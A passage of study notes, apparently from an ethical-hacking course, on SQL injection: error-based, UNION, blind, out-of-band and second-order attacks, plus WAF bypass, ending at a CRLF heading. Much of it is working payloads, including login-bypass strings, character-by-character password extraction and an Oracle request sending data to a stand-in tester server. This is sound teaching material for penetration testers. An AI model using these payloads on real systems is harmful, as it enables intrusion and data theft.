				- Source code review helps uncover and eliminate security vulnerabilities such as SQL injection, format string exploits, race conditions, memory leaks, and buffer overflows. Both automated tools and manual inspection can be used for this purpose. Automated tools, including Veracode, SonarQube, PVS-Studio, Coverity Scan, Parasoft Jtest, CAST Application Intelligence Platform (AIP), and Klocwork, assist penetration testers in identifying security flaws within the application’s source code.
				- There are two main types of source code reviews:
					- Static Code Analysis:
						- This method analyzes source code for potential vulnerabilities while the code is not executing (i.e., in a static state).
						- Techniques such as taint analysis, lexical analysis, and data flow analysis are commonly used. Many automated tools are available to facilitate static code analysis.
					- Dynamic Code Analysis:
						- Unlike static analysis, dynamic code analysis examines the application’s source code during execution. The process involves preparing input data, executing a test program, collecting relevant parameters, and analyzing output data.
						- Dynamic code analysis effectively detects SQL injection vulnerabilities and other security flaws that arise from interactions with SQL databases, web services, and other external components.
				- Source Code Analysis Tools: 
					- Veracode (www.veracode.com)
					- SonarQube (sonarsource.com)
					- PVS-Studio (pvs-studio.com)
					- Coverity Scan (scan.coverity.com)
					- Parasoft Jtest (www.parasoft.com)
					- CAST Application Intelligence Platform (AIP) (www.castsoftware.com)
					- Klocwork (www.perforce.com)
			- Testing for Blind SQL Injection Vulnerability in MySQL and MSSQL:
				- Attackers can identify blind SQL injection vulnerabilities by testing the URLs of a target website.
				- For example:
					- Consider the following URL: shop.com/items.php?id=101
					- The corresponding SQL query executed on the database might be: SELECT * FROM ITEMS WHERE ID = 101;
					- To test for blind SQL injection, an attacker can manipulate the input by injecting a condition that always evaluates to FALSE, such as 1=0: shop.com/items.php?id=101 AND 1=0
					- The resulting SQL query would be: SELECT * FROM ITEMS WHERE ID = 101 AND 1 = 0;
					- Since 1=0 is always FALSE, the query returns no results, and the page may display an empty response or an error message.
					- Next, the attacker injects a condition that always evaluates to TRUE, such as 1=1: shop.com/items.php?id=101 AND 1=1
					- The resulting SQL query becomes: SELECT * FROM ITEMS WHERE ID = 101 AND 1 = 1;
					- Since 1=1 is always TRUE, the query executes successfully, and the application returns the original items page.
					- By observing these responses, an attacker can determine that the website is vulnerable to a blind SQL injection attack, even though no error messages or direct database output are shown.
		- Launching SQL Injection Attacks:
			- After gathering information and identifying vulnerabilities, the attacker attempts various types of SQL injection attacks, including error-based SQL injection, union-based SQL injection, and blind SQL injection, among others.
			- Performing Error-Based SQL Injection:
				- An attacker exploits database-level error messages disclosed by an application to craft a vulnerability exploit request. These error messages can also be leveraged to create automated exploits, depending on the responses generated by the database server.
				- Extracting the Database Name:
					- http://www.certifiedhacker.com/page.aspx?id=1 or 1=convert(int, (DB_NAME()))--
					- Error Message: Syntax error converting the nvarchar value '[DB NAME]' into a column of data type int.
				- Extracting the First Database Table Name:
					- http://www.certifiedhacker.com/page.aspx?id=1 or 1=convert(int, (select top 1 name from sysobjects where xtype=char(85)))--
					- Error Message: Syntax error converting the nvarchar value '[TABLE NAME 1]' into a column of data type int.
				- Extracting the First Table’s Column Name:
					- http://www.certifiedhacker.com/page.aspx?id=1 or 1=convert(int, (select top 1 column_name from DBNAME.information_schema.columns where table_name='TABLE-NAME-1'))--
					- Error Message: Syntax error converting the nvarchar value '[COLUMN NAME 1]' into a column of data type int.
				- Extracting the First Field of the First Row (Data):
					- http://www.certifiedhacker.com/page.aspx?id=1 or 1=convert(int, (select top 1 COLUMN-NAME-1 from TABLE-NAME-1))--
					- Error Message: Syntax error converting the nvarchar value '[FIELD 1 VALUE]' into a column of data type int.
			- Performing Error-Based SQL Injection Using Stored Procedure Injection:
				- Many developers use stored procedures in the backend of web applications to support their functionality. A stored procedure is an SQL statement designed to perform a specific task. Developers may include both static and dynamic SQL statements within stored procedures to enhance application functionality.
				- However, if a stored procedure contains dynamic SQL statements and accepts user input, the application may become vulnerable to SQL injection attacks. Stored procedure injection attacks occur when the application fails to properly sanitize user input before processing it within the stored procedure. An attacker can exploit this lack of input validation to execute malicious SQL commands.
				- Example 1: SQL Server Stored Procedure Vulnerability
					- Consider the following stored procedure for user authentication:
						CREATE PROCEDURE user_login @username VARCHAR(20), @passwd VARCHAR(20)
						AS
						DECLARE @sqlstring VARCHAR(250)
						SET @sqlstring = 'SELECT 1 FROM users WHERE username = ''' + @username + ''' AND passwd = ''' + @passwd + ''''
						EXEC(@sqlstring)
						GO
					- User Input (Malicious Payload):
						anyusername' OR 1=1 --
						anypassword
					- Since the procedure does not sanitize input, the SQL statement always evaluates to TRUE, potentially allowing unauthorized access.
				- Example 2: Exploiting a Dynamic SQL Query in a Stored Procedure
					- Consider another vulnerable stored procedure:
						CREATE PROCEDURE get_report @columnlist VARCHAR(7900)
						AS
						DECLARE @sqlstring VARCHAR(8000)
						SET @sqlstring = 'SELECT ' + @columnlist + ' FROM ReportTable'
						EXEC(@sqlstring)
						GO
					- User Input (Malicious Payload):
						1 FROM users; UPDATE users SET password = 'password'; SELECT *
					- This input alters the intended SQL query, allowing the attacker to update all users’ passwords and retrieve additional data.
				- Key Takeaways:
					- The first example illustrates how an attacker can bypass authentication using SQL injection.
					- The second example shows how a dynamic reporting query can be exploited when users are allowed to select columns.
					- The risk increases when dynamic SQL is used without proper input validation and parameterized queries.
				- To mitigate these risks, developers should always use parameterized queries or stored procedures with input validation to prevent SQL injection attacks.
			- Performing UNION SQL Injection:
				- In UNION SQL injection, an attacker leverages the UNION clause to append a malicious query to the original SQL query, allowing them to retrieve sensitive data from the target database.
				- To test for this vulnerability, an attacker may append a single quote (') to the end of a URL parameter, such as: .php?id=1'
				- If this results in a MySQL error, the site is likely vulnerable to UNION-based SQL injection. The attacker can then use the ORDER BY statement to determine the number of columns before executing a UNION ALL SELECT attack to extract data.
				- Step-by-Step Exploitation:
					- Extract Database Name:
						- http://www.certifiedhacker.com/page.aspx?id=1 UNION ALL SELECT 1, DB_NAME(), 3, 4--
						- Response: [DB_NAME] returned from the server
					- Extract Database Tables:
						- http://www.certifiedhacker.com/page.aspx?id=1 UNION ALL SELECT 1, TABLE_NAME, 3, 4 FROM sysobjects WHERE xtype = CHAR(85)--
						- Response: [EMPLOYEE_TABLE] returned from the server
					- Extract Table Column Names:
						- http://www.certifiedhacker.com/page.aspx?id=1 UNION ALL SELECT 1, column_name, 3, 4 FROM DB_NAME.information_schema.columns WHERE table_name = 'EMPLOYEE_TABLE'--
						- Response: [EMPLOYEE_NAME]
					- Extract First Field Data:
						- http://www.certifiedhacker.com/page.aspx?id=1 UNION ALL SELECT 1, COLUMN_NAME_1, 3, 4 FROM EMPLOYEE_TABLE--
						- Response: [FIELD 1 VALUE] returned from the server
			- Bypassing Website Logins Using SQL Injection:
				- Bypassing website logins is a common malicious technique that attackers use to exploit SQL injection vulnerabilities in web applications. This method allows an attacker to gain unauthorized access to user accounts without providing valid credentials.
				- By injecting malicious SQL code into a website’s login form, an attacker can manipulate the authentication mechanism and bypass login restrictions. This is possible when applications improperly concatenate SQL commands with user-supplied inputs, allowing attackers to execute arbitrary SQL queries on the backend database.
				- Common SQL Injection Payloads for Login Forms:
					- Try entering these payloads in the username or password field of a login form:
						admin' --
						admin' #
						admin'/*
						' or 1=1--
						' or 1=1#
						' or 1=1/*
						') or '1'='1--
						') or ('1'='1--
					- These payloads attempt to terminate the SQL query early and manipulate the authentication logic to always return true, granting access without valid credentials.
					- Logging in as a Different User:
						- To log in as another user, an attacker can use: ' UNION SELECT 1, 'anotheruser', 'doesnt matter', 1--
						- If the application does not properly validate input, this query can trick it into logging in as another user.
					- Bypassing Login via MD5 Hash Check:
						- Some applications store passwords as MD5 hashes in the database. An attacker may attempt to union the query with a known password’s MD5 hash to bypass authentication.
						- Example Attack:
							Username: admin
							Password: 1234' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'--
							(Here, 81dc9bdb52d04dc20036dbd8313ed055 is the MD5 hash of 1234.)
						- This forces the application to compare the input password’s MD5 hash with a known hash, potentially granting access.
			- Performing Blind SQL Injection – Boolean Exploitation (MySQL):
				- SQL injection exploitation depends on the SQL language syntax. An attacker can combine two SQL queries to extract additional data. One common technique involves exploiting the UNION operator to retrieve information from the database. Blind SQL injection, however, is a more covert method that helps an attacker bypass security filters. A key characteristic of blind SQL injection is that it extracts data one character at a time.
				- Example 1: Extracting the First Character
					- To determine the first character of the first table entry: /?id=1+AND+555=IF(ORD(MID((SELECT pass FROM users LIMIT 0,1),1,1))=97,555,777)
					- If the "users" table contains a column named "pass", and the first character of the first entry in this column has an ASCII value of 97 (which corresponds to the letter 'a'), the database management system (DBMS) will return TRUE. Otherwise, it will return FALSE.
				- Example 2: Extracting the Second Character
					- To determine the second character of the first table entry: /?id=1+AND+555=IF(ORD(MID((SELECT pass FROM users LIMIT 0,1),2,1))=97,555,777)
					- Similarly, if the "pass" column in the "users" table has a second character with an ASCII value of 97 ('a'), the DBMS will return TRUE; otherwise, it will return FALSE.
			- Blind SQL Injection – Extracting Database User
				- Using blind SQL injection, an attacker can extract the database username by sending a series of yes/no (Boolean-based) queries. The attacker first determines the number of characters in the database username and then extracts each character individually.
				- A binary search method requires seven requests to determine a single character, so extracting an eight-character username requires approximately 56 requests.
				- Example 1: Determining Username Length
					- The attacker repeatedly increases the length value (LEN(USER)) until the database returns TRUE, indicating the correct username length.
						http://www.certifiedhacker.com/page.aspx?id=1;
						IF (LEN(USER)=1) WAITFOR DELAY '00:00:10'--

						http://www.certifiedhacker.com/page.aspx?id=1;
						IF (LEN(USER)=2) WAITFOR DELAY '00:00:10'--

						http://www.certifiedhacker.com/page.aspx?id=1;
						IF (LEN(USER)=3) WAITFOR DELAY '00:00:10'--
					- Continue increasing LEN(USER) until the DBMS delays the response, confirming the correct length.
				- Example 2: Extracting the First Character of the Username
					- The attacker checks if the first character matches ‘A’ (ASCII 97), ‘B’ (ASCII 98), ‘C’ (ASCII 99), and so on, until the database returns TRUE.
						http://www.certifiedhacker.com/page.aspx?id=1;
						IF (ASCII(LOWER(SUBSTRING((USER),1,1)))=97) WAITFOR DELAY '00:00:10'--

						http://www.certifiedhacker.com/page.aspx?id=1;
						IF (ASCII(LOWER(SUBSTRING((USER),1,1)))=98) WAITFOR DELAY '00:00:10'--

						http://www.certifiedhacker.com/page.aspx?id=1;
						IF (ASCII(LOWER(SUBSTRING((USER),1,1)))=99) WAITFOR DELAY '00:00:10'--
					- Continue increasing the ASCII value until the database response confirms the correct character.
				- Example 3: Extracting the Second Character of the Username
					- Similar to the first character, the attacker tests different ASCII values for the second character.
						http://www.certifiedhacker.com/page.aspx?id=1;
						IF (ASCII(LOWER(SUBSTRING((USER),2,1)))=97) WAITFOR DELAY '00:00:10'--

						http://www.certifiedhacker.com/page.aspx?id=1;
						IF (ASCII(LOWER(SUBSTRING((USER),2,1)))=98) WAITFOR DELAY '00:00:10'--

						http://www.certifiedhacker.com/page.aspx?id=1;
						IF (ASCII(LOWER(SUBSTRING((USER),2,1)))=99) WAITFOR DELAY '00:00:10'--
					- Continue increasing the ASCII value until the database confirms the correct character.
				- Example 4: Extracting the Third Character of the Username
					- The same technique is used to determine the third character.
						http://www.certifiedhacker.com/page.aspx?id=1;
						IF (ASCII(LOWER(SUBSTRING((USER),3,1)))=97) WAITFOR DELAY '00:00:10'--

						http://www.certifiedhacker.com/page.aspx?id=1;
						IF (ASCII(LOWER(SUBSTRING((USER),3,1)))=98) WAITFOR DELAY '00:00:10'--

						http://www.certifiedhacker.com/page.aspx?id=1;
						IF (ASCII(LOWER(SUBSTRING((USER),3,1)))=99) WAITFOR DELAY '00:00:10'--
					- Continue this process for each subsequent character until the full username is extracted.
			- Blind SQL Injection – Extracting Database Name
				- In a blind SQL injection attack, an attacker can extract the database name using a time-based blind SQL injection method. The attacker applies brute-force techniques by measuring execution time before and after running a query. If a query causes a delay (e.g., 10 seconds), the attacker infers that the condition is TRUE. Otherwise, if the response is immediate or only slightly delayed, the condition is FALSE. Using this method, the attacker can systematically determine the database name associated with the target web application.
				- Example 1: Extracting Database Name Length and Characters
					- To determine the length of the database name:
						http://www.certifiedhacker.com/page.aspx?id=1;
						IF (LEN(DB_NAME())=4) WAITFOR DELAY '00:00:10'--
					- If the response is delayed, the database name has four characters.
					- To extract each character of the database name:
						http://www.certifiedhacker.com/page.aspx?id=1;
						IF (ASCII(LOWER(SUBSTRING((DB_NAME()),1,1)))=97) WAITFOR DELAY '00:00:10'--

						http://www.certifiedhacker.com/page.aspx?id=1;
						IF (ASCII(LOWER(SUBSTRING((DB_NAME()),2,1)))=98) WAITFOR DELAY '00:00:10'--

						http://www.certifiedhacker.com/page.aspx?id=1;
						IF (ASCII(LOWER(SUBSTRING((DB_NAME()),3,1)))=99) WAITFOR DELAY '00:00:10'--

						http://www.certifiedhacker.com/page.aspx?id=1;
						IF (ASCII(LOWER(SUBSTRING((DB_NAME()),4,1)))=100) WAITFOR DELAY '00:00:10'--
					- If the database returns TRUE for these queries, the extracted database name is "ABCD".
				- Example 2: Extracting the First Database Table Name
					- To determine the length of the first table name:
						http://www.certifiedhacker.com/page.aspx?id=1;
						IF (LEN((SELECT TOP 1 NAME FROM sysobjects WHERE xtype='U'))=3) WAITFOR DELAY '00:00:10'--
					- If the response is delayed, the first table name has three characters.
					- To extract each character of the table name:
						http://www.certifiedhacker.com/page.aspx?id=1;
						IF (ASCII(LOWER(SUBSTRING((SELECT TOP 1 NAME FROM sysobjects WHERE xtype=CHAR(85)),1,1)))=101) WAITFOR DELAY '00:00:10'--

						http://www.certifiedhacker.com/page.aspx?id=1;
						IF (ASCII(LOWER(SUBSTRING((SELECT TOP 1 NAME FROM sysobjects WHERE xtype=CHAR(85)),2,1)))=109) WAITFOR DELAY '00:00:10'--

						http://www.certifiedhacker.com/page.aspx?id=1;
						IF (ASCII(LOWER(SUBSTRING((SELECT TOP 1 NAME FROM sysobjects WHERE xtype=CHAR(85)),3,1)))=112) WAITFOR DELAY '00:00:10'--
					- If the database returns TRUE for these queries, the extracted table name is "EMP".
			- Blind SQL Injection – Extracting Column Names
				- Using the same time-based blind SQL injection technique, an attacker can extract column names from a target table by measuring query execution time. The attacker determines the column name's length and extracts each character one by one.
				- Example 1: Extracting the First Column Name from the Table
					- To determine the length of the first column name:
						http://www.certifiedhacker.com/page.aspx?id=1;
						IF (LEN((SELECT TOP 1 column_name FROM ABCD.information_schema.columns WHERE table_name='EMP'))=3) WAITFOR DELAY '00:00:10'--
					- If the database response is delayed, the first column name has three characters.
					- To extract each character of the column name:
						http://www.certifiedhacker.com/page.aspx?id=1;
						IF (ASCII(LOWER(SUBSTRING((SELECT TOP 1 column_name FROM ABCD.information_schema.columns WHERE table_name='EMP'),1,1)))=101) WAITFOR DELAY '00:00:10'--

						http://www.certifiedhacker.com/page.aspx?id=1;
						IF (ASCII(LOWER(SUBSTRING((SELECT TOP 1 column_name FROM ABCD.information_schema.columns WHERE table_name='EMP'),2,1)))=105) WAITFOR DELAY '00:00:10'--

						http://www.certifiedhacker.com/page.aspx?id=1;
						IF (ASCII(LOWER(SUBSTRING((SELECT TOP 1 column_name FROM ABCD.information_schema.columns WHERE table_name='EMP'),3,1)))=100) WAITFOR DELAY '00:00:10'--
					- If the database returns TRUE for these queries, the extracted column name is "EID".
				- Example 2: Extracting the Second Column Name from the Table
					- To determine the length of the second column name:
						http://www.certifiedhacker.com/page.aspx?id=1;
						IF (LEN((SELECT TOP 1 column_name FROM ABCD.information_schema.columns WHERE table_name='EMP' AND column_name > 'EID'))=4) WAITFOR DELAY '00:00:10'--
					- If the database response is delayed, the second column name has four characters.
					- To extract each character of the column name:
						http://www.certifiedhacker.com/page.aspx?id=1;
						IF (ASCII(LOWER(SUBSTRING((SELECT TOP 1 column_name FROM ABCD.information_schema.columns WHERE table_name='EMP' AND column_name > 'EID'),1,1)))=100) WAITFOR DELAY '00:00:10'--

						http://www.certifiedhacker.com/page.aspx?id=1;
						IF (ASCII(LOWER(SUBSTRING((SELECT TOP 1 column_name FROM ABCD.information_schema.columns WHERE table_name='EMP' AND column_name > 'EID'),2,1)))=101) WAITFOR DELAY '00:00:10'--

						http://www.certifiedhacker.com/page.aspx?id=1;
						IF (ASCII(LOWER(SUBSTRING((SELECT TOP 1 column_name FROM ABCD.information_schema.columns WHERE table_name='EMP' AND column_name > 'EID'),3,1)))=112) WAITFOR DELAY '00:00:10'--

						http://www.certifiedhacker.com/page.aspx?id=1;
						IF (ASCII(LOWER(SUBSTRING((SELECT TOP 1 column_name FROM ABCD.information_schema.columns WHERE table_name='EMP' AND column_name > 'EID'),4,1)))=116) WAITFOR DELAY '00:00:10'--
					- If the database returns TRUE for these queries, the extracted column name is "DEPT".
			- Blind SQL Injection – Extracting Data from Rows
				- Using the time-based blind SQL injection method, an attacker can extract data from table rows by measuring query execution time. The attacker determines the length of the data field and then extracts each character individually.
				- Example 1: Extracting the First Field of the First Row
					- To determine the length of the first field (EID) in the first row:
						http://www.certifiedhacker.com/page.aspx?id=1;
						IF (LEN((SELECT TOP 1 EID FROM EMP))=3) WAITFOR DELAY '00:00:10'--
					- If the database response is delayed, the field contains three characters.
					- To extract each character of the field:
						http://www.certifiedhacker.com/page.aspx?id=1;
						IF (ASCII(SUBSTRING((SELECT TOP 1 EID FROM EMP),1,1))=106) WAITFOR DELAY '00:00:10'--

						http://www.certifiedhacker.com/page.aspx?id=1;
						IF (ASCII(SUBSTRING((SELECT TOP 1 EID FROM EMP),2,1))=111) WAITFOR DELAY '00:00:10'--

						http://www.certifiedhacker.com/page.aspx?id=1;
						IF (ASCII(SUBSTRING((SELECT TOP 1 EID FROM EMP),3,1))=101) WAITFOR DELAY '00:00:10'--
					- If the database returns TRUE for these queries, the extracted field data is "JOE".
				- Example 2: Extracting the Second Field of the First Row
					- To determine the length of the second field (DEPT) in the first row:
						http://www.certifiedhacker.com/page.aspx?id=1;
						IF (LEN((SELECT TOP 1 DEPT FROM EMP))=4) WAITFOR DELAY '00:00:10'--
					- If the database response is delayed, the field contains four characters.
					- To extract each character of the field:
						http://www.certifiedhacker.com/page.aspx?id=1;
						IF (ASCII(SUBSTRING((SELECT TOP 1 DEPT FROM EMP),1,1))=100) WAITFOR DELAY '00:00:10'--

						http://www.certifiedhacker.com/page.aspx?id=1;
						IF (ASCII(SUBSTRING((SELECT TOP 1 DEPT FROM EMP),2,1))=111) WAITFOR DELAY '00:00:10'--

						http://www.certifiedhacker.com/page.aspx?id=1;
						IF (ASCII(SUBSTRING((SELECT TOP 1 DEPT FROM EMP),3,1))=109) WAITFOR DELAY '00:00:10'--

						http://www.certifiedhacker.com/page.aspx?id=1;
						IF (ASCII(SUBSTRING((SELECT TOP 1 DEPT FROM EMP),4,1))=112) WAITFOR DELAY '00:00:10'--
					- If the database returns TRUE for these queries, the extracted field data is "COMP".
			- Exporting a Value Using a Regular Expression Attack:
				- An attacker can perform an SQL injection attack using regular expressions on a known table to extract confidential information such as passwords. For example, if an attacker knows that a web application stores user details in a table named UserInfo, they can execute a regular expression attack to determine passwords.
				- In general, databases store passwords in hashed form, typically using MD5 or SHA-1 algorithms. These hashed passwords consist of only hexadecimal characters [a-f0-9].
				- Extracting a Value in MySQL:
					- In MySQL, an attacker can determine the first character of a password using the following method:
					- Check if the first character is between “a” and “f”: index.php?id=2 AND 1=(SELECT 1 FROM UserInfo WHERE Password REGEXP '^[a-f]' AND ID=2)
						- If this query returns TRUE, the first character is within [a-f].
					- Narrow down the range:
						- Check if the first character is between “a” and “c”: index.php?id=2 AND 1=(SELECT 1 FROM UserInfo WHERE Password REGEXP '^[a-c]' AND ID=2)
							- If TRUE, the character is within [a-c].
							- If FALSE, the character is within [d-f].
						- Check if the first character is between “d” and “f”: index.php?id=2 AND 1=(SELECT 1 FROM UserInfo WHERE Password REGEXP '^[d-f]' AND ID=2)
							- If TRUE, the character is within [d-f].
					- Identify the exact character:
						- If the previous query returned TRUE, further refine the search:
							- Check if the first character is between “d” and “e”: index.php?id=2 AND 1=(SELECT 1 FROM UserInfo WHERE Password REGEXP '^[d-e]' AND ID=2)
								- If TRUE, check for “d” or “e”.
								- Check if the first character is “d”: index.php?id=2 AND 1=(SELECT 1 FROM UserInfo WHERE Password REGEXP '^d' AND ID=2)
									- If TRUE, the first character is confirmed as “d”.
					- Once the first character is identified, the attacker repeats the same process for the remaining characters until the full password is extracted.
				- Exporting a Value in MSSQL:
					- In MSSQL, attackers use a similar method to the one described earlier to identify the first character of a password. Now, let's see how an attacker can determine the second character using the following approach:
					- Check if the second character is between “a” and “f”: default.aspx?id=2 AND 1=(SELECT 1 FROM UserInfo WHERE Password LIKE 'd[a-f]%' AND ID=2)
						- If TRUE, the second character is within [a-f].
						- If FALSE, the attacker tests numeric values.
					- Check if the second character is between “0” and “9”: default.aspx?id=2 AND 1=(SELECT 1 FROM UserInfo WHERE Password LIKE 'd[0-9]%' AND ID=2)
						- If TRUE, further refine the range.
					- Narrowing down the numeric range:
						- Check if the second character is between “0” and “4”:	default.aspx?id=2 AND 1=(SELECT 1 FROM UserInfo WHERE Password LIKE 'd[0-4]%' AND ID=2)
							- If FALSE, the character is between [5-9].
						- Check if the second character is between “5” and “9”: default.aspx?id=2 AND 1=(SELECT 1 FROM UserInfo WHERE Password LIKE 'd[5-9]%' AND ID=2)
							- If TRUE, further refine the range.
						- Check if the second character is between “5” and “7”: default.aspx?id=2 AND 1=(SELECT 1 FROM UserInfo WHERE Password LIKE 'd[5-7]%' AND ID=2)
							- If FALSE, the character is either “8” or “9”.
					- Identify the exact character:
						- Check if the second character is “8”: default.aspx?id=2 AND 1=(SELECT 1 FROM UserInfo WHERE Password LIKE 'd[8]%' AND ID=2)
							- If TRUE, the second character is confirmed as “8”.
					- The attacker repeats this process for each remaining character until the full password is extracted. Once the password is obtained, the attacker can log in to the web application and carry out malicious activities.
			- Performing Double-Blind SQL Injection:
				- Double-blind SQL injection is a sophisticated type of SQL injection attack in which an attacker does not receive direct feedback from a web application to confirm whether the injection is successful. This makes the attack more challenging, as attackers must rely on indirect indicators or side channels to infer the success of their attempts.
				- How Double-Blind SQL Injection Works:
					- The attacker identifies an input field that is susceptible to SQL injection but does not provide direct feedback, such as error messages or data from the database.
					- The attacker constructs SQL injection payloads to manipulate the database and cause observable changes or effects within the application.
					- The attacker looks for indirect indicators of a successful injection, such as changes in application behavior, variations in response times, or impacts on other database-dependent functionalities.
					- Common techniques used in double-blind SQL injection attacks include Boolean-based blind SQL injection and time-based blind SQL injection.
				- Exploiting Double-Blind SQL Injection:
					- Double-blind SQL injection exploitation often relies on time-delay analysis. The attacker sends a query with a time delay to the web application and observes its response. In a typical double-blind injection attack, the functions benchmark() and sleep() are used to introduce time delays.
					- Example of Double-Blind SQL Injection:
						- ?id=1+AND+if((ascii(lower(substring((select password from user limit 0,1),1,1))))=97,1,benchmark(2000000,md5(now())))
						- If the guessed character is correct, the web server's response time will be delayed accordingly.
						- By manipulating the value 2000000, the attacker can optimize performance for a specific application.
						- The sleep() function serves as an alternative to benchmark(). It is often preferred because it introduces a delay without consuming significant server resources.
			- Performing Blind SQL Injection Using the Out-of-Band Exploitation Technique:
				- The out-of-band exploitation technique is useful when a tester encounters a blind SQL injection scenario. It leverages DBMS functions to establish an out-of-band connection and retrieve the results of the injected query as part of a request to the tester’s server.
				- Note: Each DBMS has its own functions for this purpose; refer to the specific DBMS documentation for details.
				- Example:
					- Consider the following SQL query: SELECT * FROM products WHERE id_product = $id_product;
					- A request to a script executing the above query might look like this: http://www.example.com/product.php?id=10
					- A malicious request exploiting blind SQL injection with an out-of-band technique could be: http://www.example.com/product.php?id=10||UTL_HTTP.request('testerserver.com:80')||(SELECT user FROM DUAL)--
					- In this example:
						- The tester concatenates the value 10 with the result of the function UTL_HTTP.request().
						- This Oracle function attempts to connect to testerserver.com and sends an HTTP GET request containing the return value of the query SELECT user FROM DUAL.
					- Setting Up a Listener:
						- The tester can set up a web server (e.g., Apache) or use Netcat to capture the request: /home/tester/nc -nLp 80
						- When the request is made, the server might log an entry like:
							GET /SCOTT HTTP/1.1
							Host: testerserver.com
							Connection: close
					- This confirms that the SQL injection was successful, and the retrieved database username (e.g., SCOTT) has been exfiltrated.
			- Exploiting Second-Order SQL Injection:
				- Second-order SQL injection occurs when an application stores user-submitted data and later uses it in a database query without proper validation or parameterization. Unlike first-order SQL injection, where the malicious input is executed immediately, second-order SQL injection exploits stored data that gets executed in a later database operation.
				- To perform this attack, an attacker must understand how the application processes and retrieves stored values. Even if the application escapes output when accepting user input, an attacker can inject a malicious SQL query that remains dormant in the database. This query is later executed when another function of the application retrieves and processes the stored data, leading to an SQL injection attack.
				- Potential Impact of Second-Order SQL Injection:
					- Depending on the backend database, database connection settings, and underlying operating system, an attacker can:
						- Read, update, or delete arbitrary data or tables in the database.
						- Execute commands on the underlying operating system.
				- Steps in a Second-Order SQL Injection Attack:
					- The attacker submits a crafted input in an HTTP request.
					- The application stores the input in the database for later use and responds to the request.
					- The attacker submits another request.
					- The application retrieves the previously stored input and processes it in a new SQL query.
					- If the stored input contains malicious SQL code, it executes when the query runs, potentially exposing or modifying data.
					- If applicable, the attacker receives a response containing the results of the executed query.
				- To mitigate second-order SQL injection, developers should implement proper input validation, use parameterized queries, and avoid relying solely on output escaping.
			- Bypassing a Firewall to Perform SQL Injection:
				- Bypassing a Web Application Firewall (WAF) using an SQL injection vulnerability is a significant security threat, as it can allow attackers to retrieve an entire database from the server. Attackers use various techniques to bypass WAF protections, including the following:
				- Normalization Method:
					- Normalization, a process used to systematically structure databases, can sometimes introduce SQL injection vulnerabilities. If an attacker identifies weaknesses in functional dependencies, they can modify the structure of an SQL query to execute an attack.
					- For example, if an SQL query is structured as follows, it becomes difficult for an attacker to exploit SQL injection to bypass the WAF: /?id=1+union+select+1,2,3/*
					- However, improper WAF configurations can create vulnerabilities. In such cases, an attacker may inject a malicious query like this: /?id=1/*union*/union/*select*/select+1,2,3/*
					- Once the WAF processes the malicious query, it transforms into: SELECT * FROM TABLE WHERE ID = 1 UNION SELECT 1,2,3--
					- This allows the attacker to retrieve unauthorized data from the database.
				- HTTP Parameter Pollution (HPP) Technique:
					- HTTP Parameter Pollution (HPP) is a simple yet effective technique that manipulates HTTP GET and POST parameters by injecting delimiter characters into query strings. This technique can affect both the server and the client by overriding or appending additional parameters.
					- For example, if a WAF protects a website, the following request would normally be blocked: /?id=1;select+1,2,3+from+users+where+id=1--
					- However, an attacker can use the HPP technique to modify the query and bypass the WAF: /?id=1;select+1&id=2,3+from+users+where+id=1--
					- By injecting multiple parameters, the attacker manipulates how the WAF interprets the request, allowing SQL injection to succeed.
				- HTTP Parameter Fragmentation (HPF) Technique:
					- HTTP Parameter Fragmentation (HPF) is a technique used to bypass security filters by manipulating HTTP request data. It allows attackers to fragment HTTP parameters, making it difficult for the Web Application Firewall (WAF) to detect malicious queries. This technique can be combined with HTTP Parameter Pollution (HPP) and the UNION operator to evade firewalls.
					- Consider the following vulnerable code:
						Query("SELECT * FROM table WHERE a=".$_GET['a']." AND b=".$_GET['b']);
						Query("SELECT * FROM table WHERE a=".$_GET['a']." AND b=".$_GET['b']." LIMIT ".$_GET['c']);
					- A WAF might block the following malicious query: /?a=1+union+select+1,2/*
					- However, an attacker can use the HPF technique to bypass the WAF by fragmenting the query: /?a=1+union/*&b=*/select+1,2
					- Or a more advanced variation: /?a=1+union/*&b=*/select+1,pass/*&c=*/from+users--
					- This results in the transformed SQL query:
						SELECT * FROM TABLE WHERE a=1 UNION/* AND b=*/SELECT 1,2
						SELECT * FROM TABLE WHERE a=1 UNION/* AND b=*/SELECT 1,pass/* LIMIT */FROM USERS--
					- Since the WAF may not properly reconstruct the fragmented request, the malicious query can execute successfully.
				- Blind SQL Injection:
					- Blind SQL injection is an attack method that exploits SQL vulnerabilities while avoiding detection by replacing WAF signatures with synonyms using SQL functions. Attackers can use logical operators, string manipulations, and mathematical functions to bypass firewalls.
					- Examples of logical request injections:
						- AND/OR-based injection:
							/?id=1+OR+0x50=0x50
							/?id=1+AND+ascii(lower(mid((SELECT pwd FROM users LIMIT 1,1),1,1)))=74
						- Using negation, inequality signs, and logical expressions:
							AND 1
							AND 1=1
							AND 2<3
							AND 'a'='a'
							AND 'a'<>'b'
							AND 3<=2
					- These techniques help attackers manipulate SQL queries while evading detection mechanisms in WAFs.
				- Signature Bypass:
					- Signature-based detection is a common WAF protection mechanism that blocks SQL injection attempts by matching known malicious query patterns. However, attackers can transform SQL signatures in various ways to evade detection.
					- For instance, if a WAF is configured to block the following attack query: /?id=1+union+(select+1,2+from+users)
					- An attacker can modify the query to bypass the WAF using techniques like obfuscation, encoding, and redundant parentheses:
						/?id=1+union+(select+'xz'from+xxx)
						/?id=(1)union(select(1),mid(hash,1,32)from(users))
						/?id=1+union+(select'1',concat(login,hash)from+users)
						/?id=(1)union(((((((select(1),hex(hash)from(users))))))))
						/?id=xx(1)or(0x50=0x50)
					- By disguising the attack payload, the attacker prevents the WAF from recognizing and blocking the SQL injection attempt.
				- Buffer Overflow Method:
					- An attacker can exploit buffer overflow vulnerabilities to crash and bypass a firewall. Since most firewalls are developed using C/C++, they may be susceptible to buffer overflow attacks, making it easier for an attacker to exploit them.
					- For example, consider the following URL, where an attacker attempts an SQL injection attack to bypass the Web Application Firewall (WAF): http://www.certifiedhacker.com/index.php?page_id=15+and+(select 1)=(Select 0xAA[..(add about 1200 “A”)..])+/*!uNIOn*/+/*!SeLECt*/+1,2,3,4....
					- To check whether the firewall is vulnerable to a buffer overflow attack, the attacker can send the following request: ?page_id=null%0A/**//*!50000%55nIOn*//*yoyu*/all/**/%0A/*!%53eLEct*/ %0A/*nnaa*/+1,2,3,4...
					- If the server responds with a 500 Internal Server Error, it indicates that the firewall has crashed, confirming its vulnerability to a buffer overflow attack. The attacker can then exploit this weakness to bypass the firewall and execute further attacks.
				- CRLF Injection Technique:
